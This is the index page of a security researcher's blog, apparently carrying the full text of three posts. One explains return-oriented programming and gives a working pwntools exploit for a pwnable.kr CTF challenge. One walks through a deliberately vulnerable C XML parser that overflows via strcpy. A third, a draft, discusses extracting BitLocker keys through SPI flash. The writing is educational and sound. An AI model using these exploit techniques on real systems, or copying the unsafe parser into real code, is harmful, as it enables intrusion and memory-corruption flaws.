<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    
    <meta property="og:type" content="website">
<meta property="og:title" content="Ran Varshaver">
<meta property="og:url" content="https://ran-var.github.io/blog/">
<meta property="og:site_name" content="Ran Varshaver">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Ran Varshaver">
<meta name="twitter:card" content="summary">
    
    
    
    
      
        <link rel="shortcut icon" href="/images/favicon.ico">
      
      
        <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
      
      
        <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
      
    

    <title>Ran Varshaver</title>

    <!-- async scripts -->
    
    

    
<link rel="stylesheet" href="/blog/css/style.css">


    

    
<meta name="generator" content="Hexo 8.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
    <div class="content index py4 h-card">
        
          <header id="header">
  <a class="u-url u-uid" href="/blog/">
    
      
        <img
          id="logo"
          alt
          class="u-logo"
          src="/blog/images/logo.png"
        />
      
    
    <div id="title">
      <h1 class="p-name">Ran Varshaver</h1>
      <h2 class="subtitle">Security Researcher</h2>
    </div>
  </a>
</header>

        
        <section id="about" class="p-note">
  <p>
    Hey! I'm Ran, I do security for work and kitesurf for sanity. <br>
    I like to write whatever comes to my mind on here.
  </p>

  
    <p>
      Find me on
      
      
      
        
        
          <a class="icon u-url" target="_blank" rel="noopener me" href="https://github.com/ran-var" aria-label="github" title="github">
            <i class="fa-brands fa-github"></i>
          </a>
        
        , 
        
      
        
        
          <a class="icon u-url" target="_blank" rel="noopener me" href="https://www.linkedin.com/in/ranvarshaver/" aria-label="linkedin" title="linkedin">
            <i class="fa-brands fa-linkedin"></i>
          </a>
        
         and 
        
      
        
        
          <a class="icon u-email" target="_blank" rel="noopener" href="mailto:ran.varshaver1@gmail.com" aria-label="mail" title="mail">
            <i class="fa-solid fa-envelope"></i>
          </a>
        
        .
        
      
    </p>
  
</section>

<section id="writing">
  <span class="h1"><a href="/blog/">Writing</a></span>
  
  
  <ul class="post-list">
    
    
         
    
      <li class="post-item" data-content="Bypassing NX and DEPSo lets talk about ROP, virtually every compiler nowadays secures programs by adding NX and DEP attributes which means the memory is either writable or executable but never both. You canâ€™t just inject shellcode onto the stack and have it executed, it will just kill the process.This should have in theory ended stack based exploitation but it didnâ€™t.
How ROP Works Under the HoodHereâ€™s the thing, you donâ€™t need to execute new code. The binary and itâ€™s libraries already have tons of executable code that we are able to use to our advantage.In the epilogue of each procedure we will always see something like this:
123mov esp, ebppop ebp ; both lines substituted as &#x27;leave&#x27; instruction on x64ret
The first two lines just clear up the local variables and restore the stack frame for the caller.Now ret is the key instruction for ROP, you can think of it as sort of an abstraction for:
1mov eip, [esp]
Normally this would contain the address of where this procedure was originally called so program execution continues as intended, but the CPU doesnâ€™t really care if the address in eip belongs to the caller or not - it just goes there.If you control the stack, you control where every ret goes. Thatâ€™s the foundation of ROP.
So Whatâ€™s a Gadget Chain?A gadget is any sequence of instructions that ends in ret. Theyâ€™re just snippets of existing code scattered across the binary and itâ€™s libraries.ROP chains work by overflowing a vulnerable function with arbitrary addresses so once the first gadget executes and hits itâ€™s own ret, that instruction just pops off the next address weâ€™ve provided in the chain and jumps to it. Each gadgetâ€™s ret becomes the bridge to the next gadget, youâ€™re basically just hijacking the return mechanism to manipulate the control flow of the program.
Practical ROP ChainingA great example for this type of exploitation technique is the Horcruxes challenge from pwnable.kr, although this isnâ€™t really a writeup Iâ€™ll try to do my best to explain how this challenge goes.For the sake of demonstartion the binary had PIE disabled so addresses would remain static and we could just copy them into our exploit.
1234checksec --file=horcruxesRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILEFull RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols	  No	0		3		horcruxes
The binary initializes seven functions A-G with each of them storing a random value, and we need them sum of all these integers to receive the flag. However we cannot see those integers during regular execution since they are generated at runtime so weâ€™ll need to jump to each of the seven functions one after the other to print them out (see where weâ€™re going?).Another interesting point to clear up: why couldnâ€™t we just use the first gadget to jump to where the flag is printed?The challengeâ€™s author has accounted for this, and all addresses inside the ropme function contain a 0a which converts into a newline, stopping the puts function which relies on newlines to figure out where the end of a string is.
The VulnerabilityLooking at the disassembly, the ropme function has a classic buffer overflow via gets():
1call   0x8041080 &lt;gets@plt&gt;
No bounds checking, no canary. We can overflow straight into the saved return address.Now all we have to do is find the addresses (remember, no PIE!) of all the functions from A to G and create a chain that does the following:

First things first - fills up the buffer(116) allocated for the gets() function plus saved ebp(4).
Overflow with our address chain of the A-G functions.
Add the address of where ropme is called from main, since we cannot jump to inside that function.

123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from ctypes import c_intelf = ELF(&quot;./horcruxes&quot;)p = elf.process()horcruxes = [    0x0804129d,    0x080412cf,    0x08041301,    0x08041333,    0x08041365,    0x08041397,    0x080413c9,]ropme = 0x080414fcexp = 0p.recvuntil(b&quot;Menu:&quot;)p.sendline(b&quot;123&quot;)p.recvuntil(b&quot;earned? : &quot;)payload = b&quot;A&quot;*116payload += b&quot;B&quot;*4for addr in horcruxes:    payload += p32(addr)payload += p32(ropme)p.sendline(payload)for _ in range(7):    p.recvuntil(b&quot;+&quot;)    tmp = p.recvuntil(b&quot;)&quot;, drop=True)    exp += int(tmp)log.info(&quot;EXP sum: &quot; + str(c_int(exp).value))p.recvuntil(b&quot;Menu:&quot;)p.sendline(b&quot;123&quot;)p.recvuntil(b&quot;earned? : &quot;)p.sendline(str(c_int(exp).value).encode())p.interactive()
When ropme hits ret the chain begins starting at A, all the way to G, and back to ropme. Each function prints the random value, then we parse and sum handling the integer overflow. Submitting the sum back at the binary prints out the flag.
ROP WeaponizationIn the this challenge ROP was used primarily for control flow manipulation to leak values, but its real potential lies in achieving code execution. In real-world exploitation, ROP is the primary technique for bypassing Data Execution Prevention (DEP&#x2F;NX) and obtaining a shell. Here are two common routes for ROP weaponization:

ret2libc&#x2F;direct call: use resolved libc addresses to call system(&quot;/bin/sh&quot;), execve, or other libc helpers. Fast and compact when libc is known or leakable.
Full ROP payloads: when you need more control, build a gadget chain to write strings into .bss, set up registers, and call mprotect/mmap or syscalls to change memory permissions or invoke execve directly. Stack pivot to a larger controlled buffer if the saved-return slot is too small.

Whether youâ€™re writing code or breaking it understanding how ret works, how the stack controls execution, and how code boundaries are really just conventions-that knowledge makes you better at your job. Because security isnâ€™t about what code is supposed to do. Itâ€™s about what code can do when someone controls inputs you didnâ€™t expect them to control.
">
        
    <div class="meta">
      
        
          <time datetime="2025-10-05T00:00:00.000Z" class="dt-published" itemprop="datePublished">05-10-2025</time>
        
      
    </div>


        <span class="post-title">
    
        <a class="" href="/blog/2025/10/05/rop/">Return Oriented Programming: Exploitation Without Execution</a>
    


</span>
        <span class="reading-time"></span>
      </li>
    
      <li class="post-item" data-content="Poking at Chinese FirmwareI recently spent some time reversing a pre-historic smart device as a research exercise. While poking at the firmware binaries I stumbled on a bug inside how the device parses the config XML file.The vendor hasnâ€™t issued a statement yet(shocker) so I will try to the best of my ability to recreate a similar vulnerable function without accidentally disclosing any real detail that can be used to identify the device.
Understanding XML: Structure Without SafetyXML (eXtensible Markup Language) is a markup language that uses a hierarchical structure of elements enclosed in angle brackets.Think of XML as a structuring system where information gets organized into labeled elements that can hold both data and other elements.
1234&lt;device&gt;	&lt;name&gt;Generic Router&lt;/name&gt;	&lt;firmware_version&gt;2.1&lt;/firmware_version&gt;&lt;/device&gt;
XML elements can also contain attributes which provide additional metadata about the element, an attribute appears inside the opening tag and consists of a name-value pair:
1&lt;device type=&quot;thermostat&quot; model=&quot;v2.1&quot;&gt;Smart Home Device&lt;/device&gt;

Nowadays XML is often compared and somewhat replaced by JSON or YAML which are considered lighter and simpler alternatives, but it remains a standard in government, healthcare, telecom, IoT, and finance systems where strict schemas and validation are critical.
However, XMLâ€™s verbose nature and complex parsing requirements create more opportunities for security vulnerabilities. XML parsers must handle opening and closing tags, attributes, namespaces, character encoding, and various formatting edge cases.
Learning from Critical VulnerabilitiesTwo critical XML parsing vulnerabilities demonstrate just how dangerous these flaws can be in production systems.
CVE-2016-1834 affected libxml2 &lt;2.9.4, a widely used XML parsing library. The vulnerability is a heap based buffer overflow in the xmlStrncat function which allowed attackers to execute remote code or cause a memory corruption based denial of service attack. The vulnerability was especially significant on Apple platforms, though unpatched Linux systems using libxml2 were also at risk.
CVE-2019-5063 affected OpenCV 4.1.0. It also involves a heap based buffer overflow in the XML parser, triggered when processing very long or unrecognized character entities in XML files and copying it into a fixed size buffer without proper bounds checking:
12#define CV_FS_MAX_LEN 4096char strbuf[CV_FS_MAX_LEN + 16];

Config Parsing in IoT DevicesTo see how XML buffer overflows can happen in IoT devices, letâ€™s look at a simple configuration parser for device credentials. This example reflects the same type of flaws found in CVE-2016-1834 and CVE-2019-5063, but in the context of parsing default admin credentials from an XML file.
Many IoT devices keep default credentials and network settings in (ideally) encrypted XML files that are loaded during startup. A typical parser might look like this:
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;libxml/parser.h&gt;typedef struct &#123;    char username[16];    char password[32];    char device_id[36];    char wifi_ssid[32];    int config_version;&#125; config_t;int parse_config(const char* filename, config_t* cfg) &#123;    xmlDocPtr doc = xmlParseFile(filename);    if (!doc) return -1;    xmlNodePtr root = xmlDocGetRootElement(doc);    if (!root) &#123; xmlFreeDoc(doc); return -1; &#125;    xmlNodePtr node;    char buf[256];    for (node = root-&gt;children; node; node = node-&gt;next) &#123;        if (node-&gt;type != XML_ELEMENT_NODE) continue;        char* content = (char*)xmlNodeGetContent(node);        if (!content) continue;        strcpy(buf, content);        if (strcmp((char*)node-&gt;name, &quot;username&quot;) == 0)            strcpy(cfg-&gt;username, buf);        else if (strcmp((char*)node-&gt;name, &quot;password&quot;) == 0)            strcpy(cfg-&gt;password, buf);        else if (strcmp((char*)node-&gt;name, &quot;device_id&quot;) == 0)            strcpy(cfg-&gt;device_id, buf);        else if (strcmp((char*)node-&gt;name, &quot;wifi_network&quot;) == 0)            strcpy(cfg-&gt;wifi_ssid, buf);        else if (strcmp((char*)node-&gt;name, &quot;config_ver&quot;) == 0)            cfg-&gt;config_version = atoi(buf); //only safe part of the parser        xmlFree(content);    &#125;    xmlFreeDoc(doc);    return 0;&#125;

The full vulnerable parser can be found here.With our parser compiled, we can inspect exactly what happens when an attacker supplies malicious input.
123pwndbg xml_demopwndbg&gt; b parse_configpwndbg&gt; r

Once inside we can just step over instructions until we hit the part where our trustworthy password is copied into memory.
12345678910111213141516171819202122232425262728â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€In file: /home/rvarr/xml_overflow/parser.c:27   22         strcpy(buf, content);   23    24         if (strcmp((char*)node-&gt;name, &quot;username&quot;) == 0)   25             strcpy(cfg-&gt;username, buf);   26         else if (strcmp((char*)node-&gt;name, &quot;password&quot;) == 0) â–º 27             strcpy(cfg-&gt;password, buf);   28         else if (strcmp((char*)node-&gt;name, &quot;device_id&quot;) == 0)   29             strcpy(cfg-&gt;device_id, buf);   30         else if (strcmp((char*)node-&gt;name, &quot;wifi_network&quot;) == 0)   31             strcpy(cfg-&gt;wifi_ssid, buf);   32         else if (strcmp((char*)node-&gt;name, &quot;config_ver&quot;) == 0)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ rsp 0x7fffffffd890 â€”â–¸ 0x7fffffffd9d0 â—‚â€” 0x6e696d6461 /* &#x27;admin&#x27; */01:0008â”‚-128 0x7fffffffd898 â€”â–¸ 0x555555556004 â—‚â€” &#x27;config.xml&#x27;02:0010â”‚-120 0x7fffffffd8a0 â—‚â€” &#x27;\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  \nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  \nCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  \nDDDD                              \n    &#x27;03:0018â”‚-118 0x7fffffffd8a8 â—‚â€” &#x27;AAAAAAAAAAAAAAAAAAAAAAAAA  \nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  \nCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  \nDDDD                              \n    &#x27;... â†“        2 skipped06:0030â”‚-100 0x7fffffffd8c0 â—‚â€” &#x27;A  \nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  \nCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  \nDDDD                              \n    &#x27;07:0038â”‚-0f8 0x7fffffffd8c8 â—‚â€” &#x27;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  \nCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  \nDDDD                              \n    &#x27;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º 0   0x5555555553b0 parse_config+278   1   0x5555555551dd main+36   2   0x7ffff7c24ca8 None   3   0x7ffff7c24d65 __libc_start_main+133   4   0x5555555550f1 _start+33â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

At this point weâ€™re right at the instruction that causes the overflow, so once we step over into the next instruction and inspect the memory at the struct.
123456789101112131415161718pwndbg&gt; npwndbg&gt; x/128bx &amp;cfg-&gt;password0x7fffffffd9f0:	0x0a	0x41	0x41	0x41	0x41	0x41	0x41	0x410x7fffffffd9f8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x410x7fffffffda00:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x410x7fffffffda08:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x410x7fffffffda10:	0x41	0x20	0x20	0x0a	0x42	0x42	0x42	0x420x7fffffffda18:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x420x7fffffffda20:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x420x7fffffffda28:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x420x7fffffffda30:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x420x7fffffffda38:	0x42	0x42	0x42	0x42	0x20	0x20	0x0a	0x430x7fffffffda40:	0x43	0x43	0x43	0x43	0x43	0x43	0x43	0x430x7fffffffda48:	0x43	0x43	0x43	0x43	0x43	0x43	0x43	0x430x7fffffffda50:	0x43	0x43	0x43	0x43	0x43	0x43	0x43	0x430x7fffffffda58:	0x43	0x43	0x43	0x43	0x43	0x43	0x43	0x200x7fffffffda60:	0x20	0x0a	0x44	0x44	0x44	0x44	0x20	0x200x7fffffffda68:	0x20	0x20	0x20	0x20	0x20	0x20	0x20	0x20

Setting this memory view side by side with config.xml we are able to directly see the hex representation of the ASCII characters weâ€™ve overflown the memory with:A=0x41*32, B=0x42*36, C=0x43*32, D=0x44*4 
This example was a significant oversimplification of how IoT&#x2F;smart home devices utilize XML for parsing credentials, but it gets the point across: blindly trusting XML and dumping it into fixed-size buffers is risky.In real-world applications, it can crash devices, overwrite important memory, or even open the door to more serious exploits just as weâ€™ve seen with the two CVEs covered and many more that have been discovered over the years.
">
        
    <div class="meta">
      
        
          <time datetime="2025-09-16T00:00:00.000Z" class="dt-published" itemprop="datePublished">16-09-2025</time>
        
      
    </div>


        <span class="post-title">
    
        <a class="" href="/blog/2025/09/16/xml-overflow/">Stack Smashing Through XML: Using IoT Configs As Attack Vectors</a>
    


</span>
        <span class="reading-time"></span>
      </li>
    
      <li class="post-item" data-content="work in progress ðŸ¤«Honestly the only reason I got into this rabbit hole is having an old laptop lying around and wondered how far I can stretch the line without bricking it entirely. In particular to see how disk encryption actually works under the hood and trying to break it by clipping some cheap hardware hacking tools from AliExpress like a CH341A.
Special thanks to Xeno Kovah and OpenSecurityTraining2 for sparking my curiosity and providing some incredible quality material.
BitLocker 101: Keys, TPMs, and CryptographyLets walk through how BitLocker is supposed to work, because the more you understand the elegant design, the more the real world flaws start to make sense.BitLocker represents Microsoftâ€™s attempt to solve a genuinely hard problem: how do you automatically decrypt a hard drive when an authorized user boots their computer, but keep it locked when an unauthorized person tries to access the data?
The solution relies on a â€œtrusted bootâ€ process. Think of it as a chain of cryptographic measurements that starts with your computerâ€™s firmware and continues through each piece of software that loads during startup. Each component hashes the next, creating a unique fingerprint of your systemâ€™s exact boot state.
It does so by using whatâ€™s called a Trusted Platform Module(TPM) chip, which only hands over the keys once the measured state matches the same state as when Bitlocker was first configured on the machine. If anything significant has changed in the boot process the TPM chip will not transfer the keys and may require a Bitlocker recovery process.
This measurement process creates whatâ€™s called a â€œroot of trustâ€ but like any chain, itâ€™s only as strong as its weakest link. The TPM measures each component, but it has to trust that the measurements it receives are valid, and this is where the elegance starts to show cracks.
When your computer boots, the UEFI&#x2F;BIOS firmware is the first code to run, responsible for measuring itself and the next component in the chain. But hereâ€™s the catch: the UEFI firmware lives in SPI flash memory which is a small chip thatâ€™s often easily accessible on the motherboard and wasnâ€™t designed with sophisticated tamper protection in mind.
Exercise! Try looking at an old motherboard or any PCB you have lying around and find a small 8-legged chip and do a short google search on the text thatâ€™s written on it, most chip vendors provide an open source datasheet
This is where a cheap flash programmer comes into play, it can directly read and write to SPI flash chips containing the sealed BitLocker keys or parameters used to derive them. The irony is that BitLockerâ€™s strength its tight integration with the hardware boot process also creates its most exploitable weakness. Every piece of the trusted boot chain becomes a potential attack surface for someone with physical access.
">
        
    <div class="meta">
      
        
          <time datetime="1111-11-11T00:00:00.000Z" class="dt-published" itemprop="datePublished">11-11-1111</time>
        
      
    </div>


        <span class="post-title">
    
        <a class="" href="/blog/1111/11/11/bitlocker-leak/">$5 UEFI Attack: How Attackers Extract BitLocker Keys Through Hardware</a>
    


</span>
        <span class="reading-time"></span>
      </li>
    
  </ul>

  

  <script>
    document.querySelectorAll('.post-item').forEach(item => {
      const text = item.getAttribute('data-content') || '';
      const words = text.trim().split(/\s+/).length;
      const minutes = Math.max(1, Math.ceil(words / 200));
      const span = item.querySelector('.reading-time');
      if(span) span.textContent = minutes + ' min read';
    });
  </script>
</section>


<section id="repositories">
  <span class="h1"><a target="_blank" rel="noopener" href="https://github.com/ran-var">Repositories</a></span>

  <ul class="post-list">
    
      <li class="post-item repo-item">
        <div class="repo-content">
          <div>
            <a href="https://github.com/ran-var/Process-Librarian" target="_blank" rel="noopener">Process Librarian</a>
            <div class="meta">Windows process analysis tool with built in DLL injector</div>
          </div>
        </div>
        <div class="repo-stars" data-repo="ran-var/Process-Librarian">
          <i class="fa-regular fa-star"></i> <span class="star-count">-</span>
        </div>
      </li>
    
  </ul>

  <script>
    async function fetchStars() {
      const elements = document.querySelectorAll('.repo-stars');
      for (const el of elements) {
        const repo = el.getAttribute('data-repo');
        if (!repo) continue;
        try {
          const response = await fetch(`https://api.github.com/repos/${repo}`);
          if (!response.ok) throw new Error('API error');
          const data = await response.json();
          const count = data.stargazers_count || 0;
          el.querySelector('.star-count').textContent = count >= 1000
            ? (count / 1000).toFixed(1) + 'k'
            : count.toString();
        } catch (e) {
          console.error('Error fetching stars for ' + repo + ':', e);
          el.querySelector('.star-count').textContent = '0';
        }
      }
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', fetchStars);
    } else {
      fetchStars();
    }
  </script>

  <style>
    .repo-item {
      align-items: center !important;
    }
    .repo-content {
      flex: 1;
    }
    .repo-content .meta {
      margin-top: 0.25rem;
      font-size: 0.9em;
      width: auto !important;
      min-width: auto !important;
      margin-right: 0 !important;
      flex-shrink: 1;
    }
    .repo-stars {
      margin-left: 1rem;
      white-space: nowrap;
      color: var(--accent);
    }
  </style>
</section>




        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025
    Ran Varshaver
  </div>
  <div class="footer-right">
  </div>
</footer>

    </div>
    

 
  <link
    rel="preload"
    href="/blog/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/blog/lib/font-awesome/css/all.min.css"
  /></noscript>


    
  
<script src="/blog/lib/jquery/jquery.min.js"></script>







<script src="/blog/js/main.js"></script>



</body>
</html>
